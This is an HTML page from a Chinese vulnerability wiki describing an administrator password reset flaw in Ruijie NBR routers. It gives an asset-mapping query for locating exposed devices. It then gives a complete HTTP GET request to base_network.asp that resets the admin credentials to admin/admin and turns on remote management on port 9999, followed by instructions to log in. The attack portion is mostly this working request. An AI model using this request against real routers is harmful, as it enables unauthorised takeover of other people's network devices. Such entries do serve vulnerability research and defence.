@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7%E8%B7%AF%E7%94%B1%E5%99%A8/%E9%94%90%E6%8D%B7NBR%E7%B3%BB%E5%88%97%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>锐捷NBR系列多款路由器存在管理员密码重置漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u9510\u6377NBR\u7cfb\u5217\u591a\u6b3e\u8def\u7531\u5668\u5b58\u5728\u7ba1\u7406\u5458\u5bc6\u7801\u91cd\u7f6e\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8fileupload.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8fileupload.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷NBR路由器fileupload.php任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E9%94%90%E6%8D%B7EWEB%E8%B7%AF%E7%94%B1%E5%99%A8timeout.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E9%94%90%E6%8D%B7EWEB%E8%B7%AF%E7%94%B1%E5%99%A8timeout.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷 EWEB路由器 timeout.php任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="nbr">锐捷NBR系列多款路由器存在管理员密码重置漏洞<a class="headerlink" href="#nbr" title="Permanent link">&para;</a></h1>
+<p><strong>一、漏洞简介</strong><br />
+<font style="color:rgb(34, 34, 34);">锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。锐捷NBR 路由器系统存在存在管理员密码重置漏洞，攻击者通过漏洞重置密码登录后台</font><br />
+<strong>二、影响版本</strong></p>
+<p>Ruijie-NBR路由器</p>
+<p><strong>三、资产测绘</strong></p>
+<div class="highlight"><pre><span></span><code>body=&quot;上层网络出现异常，请检查外网线路或联系ISP运营商协助排查&quot;
+</code></pre></div>
+<p><img alt="1717734645117-802010e5-a75c-45f1-8f4c-551281d27278.png" src="./img/kB-drvIkcHwBbcTn/1717734645117-802010e5-a75c-45f1-8f4c-551281d27278-249342.png" /></p>
+<p><strong>四、漏洞复现</strong></p>
+<div class="highlight"><pre><span></span><code>GET /base_network.asp?isbase64=1&amp;reboot=1&amp;shortset=1&amp;time_type=auto&amp;exec_service=ntpc-restart&amp;http_lanport=80&amp;remote_management=1&amp;http_wanport=9999&amp;http_username=admin&amp;http_gname_en=0&amp;http_passwd=admin&amp;_= HTTP/1.1
+Host: 
+Accept: application/json, text/javascript, */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+Referer: 111.59.193.189:9999/index.htm?_1708839153
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: wys_userid=; userid=admin; gw_userid=admin,gw_passwd=
+Connection: close
+</code></pre></div>
+<p><img alt="1717734727800-954b048d-0b4f-45f0-af30-40f0e26df8af.png" src="./img/kB-drvIkcHwBbcTn/1717734727800-954b048d-0b4f-45f0-af30-40f0e26df8af-577558.png" /></p>
+<div class="highlight"><pre><span></span><code>使用admin/admin登录系统
+</code></pre></div>
+<p><img alt="1717735035159-6a15be6b-d351-4ebd-bce1-f071a0f688c8.png" src="./img/kB-drvIkcHwBbcTn/1717735035159-6a15be6b-d351-4ebd-bce1-f071a0f688c8-178013.png" /></p>
+<blockquote>
+<p>更新: 2024-06-24 11:42:26<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/em4uexuiwqtgq0ey">https://www.yuque.com/xiaokp7/ocvun2/em4uexuiwqtgq0ey</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8fileupload.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8fileupload.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷NBR路由器fileupload.php任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E9%94%90%E6%8D%B7EWEB%E8%B7%AF%E7%94%B1%E5%99%A8timeout.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E9%94%90%E6%8D%B7EWEB%E8%B7%AF%E7%94%B1%E5%99%A8timeout.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷 EWEB路由器 timeout.php任意文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
